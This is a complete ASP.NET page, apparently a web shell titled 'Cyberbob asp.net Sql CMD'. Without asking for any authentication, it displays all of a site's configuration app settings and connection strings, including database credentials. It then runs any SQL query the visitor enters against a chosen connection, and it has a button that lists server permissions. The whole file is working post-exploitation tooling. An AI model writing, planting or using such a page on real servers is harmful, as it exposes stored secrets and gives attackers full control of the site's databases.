<%@ Page Language="C#" Debug="true" Trace="false" %>

<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Data.SqlClient" %>
<%@ Import Namespace="System.Data" %>
<%@ Import Namespace="System.Data" %>
<%@ Import Namespace="System.Configuration" %>

<script language="c#" runat="server">
    void Page_Load(object sender, EventArgs e)
    {
        if (!this.IsPostBack)
        {
            this.getConnectionString();
        }

    }

    void getConnectionString()
    {
        foreach(string key in System.Configuration.ConfigurationManager.AppSettings)
        {
            string value = ConfigurationManager.AppSettings[key];
            this.lstAppSettings.Items.Add(key + ":" + value);
        }

        foreach (ConnectionStringSettings connection in System.Configuration.ConfigurationManager.ConnectionStrings)
        {
            this.ListBox1.Items.Add(connection.ConnectionString);
        }
    }
    void ExcuteCmd()
    {
        try
        {
            SqlConnection con = new SqlConnection(this.txtConnection.Text);
            SqlCommand cmd = new SqlCommand(this.txtQuery.Text, con);
            //cmd.Parameters.AddWithValue("@id",Your parameters value if any);
            //cmd.CommandType = CommandType.Text;
            DataTable dt = new DataTable();
            SqlDataAdapter da = new SqlDataAdapter(cmd);
            da.Fill(dt);
            this.grdResult.DataSource = dt;
            this.grdResult.DataBind();
        }
        catch (Exception ex)
        {
            this.lblError.Text = ex.ToString();
        }

    }

    void cmdExe_Click(object sender, System.EventArgs e)
    {
        this.lblError.Text = "";
        this.ExcuteCmd();

    }
    void cmdPerm_Click(object sender, System.EventArgs e)
    {
        this.lblError.Text = "";
        this.txtQuery.Text = "SELECT * FROM fn_builtin_permissions(default) ORDER BY class_desc";
        this.ExcuteCmd();

    }


    protected void ListBox1_SelectedIndexChanged(object sender, EventArgs e)
    {
        this.txtConnection.Text = this.ListBox1.SelectedValue;
    }
</script>
<html>
<head>
    <title>Cyberbob asp.net Sql CMD</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
</head>
<body>
    <form id="cmd" method="post" runat="server">
        <div class="container">
            <div class="row">
                <div class="col-md-2">
                    ConnectionString
                </div>
                <div class="col-md-10">
                    <asp:TextBox ID="txtConnection" runat="server" Style="width: 100%"></asp:TextBox>

                </div>
            </div>
            <div class="row">
                <div class="col-md-2">
                    Query:
                </div>
                <div class="col-md-10">
                    <asp:TextBox ID="txtQuery" Rows="5" Style="width: 100%" TextMode="MultiLine" runat="server" Width="250px"></asp:TextBox>

                </div>
            </div>
             <div class="row">
            <div class="col-md-1">
                <asp:Button ID="testing" runat="server" Text="Execute" OnClick="cmdExe_Click" CssClass="btn btn-success"></asp:Button>

            </div>
            <div class="col-md-1">
                <asp:Button ID="cmdPerms" runat="server" Text="View Perms" OnClick="cmdPerm_Click"  CssClass="btn btn-warning"></asp:Button>

            </div>
        </div>

            <div class="row">
                <div class="col-md-12">
                      <asp:GridView ID="grdResult" runat="server" />
                </div>
            </div>

            <div class="row">
                <div class="col-md-1">
                    ConnectionString
                </div>
                <div class="col-md-11">
                    <asp:ListBox ID="ListBox1" runat="server" AutoPostBack="true" OnSelectedIndexChanged="ListBox1_SelectedIndexChanged"></asp:ListBox>
                </div>
                
            </div>
            <div class="row">
                <div class="col-md-1">
                    AppSettings
                </div>
                <div class="col-md-11">
             <asp:ListBox ID="lstAppSettings" runat="server"  ></asp:ListBox>
                </div>
                
            </div>

             
        </div>
       

              
        <br />
         <asp:Label ID="lblError" runat="server" ForeColor="Red" />
       
        
        
    </form>
</body>
</html>
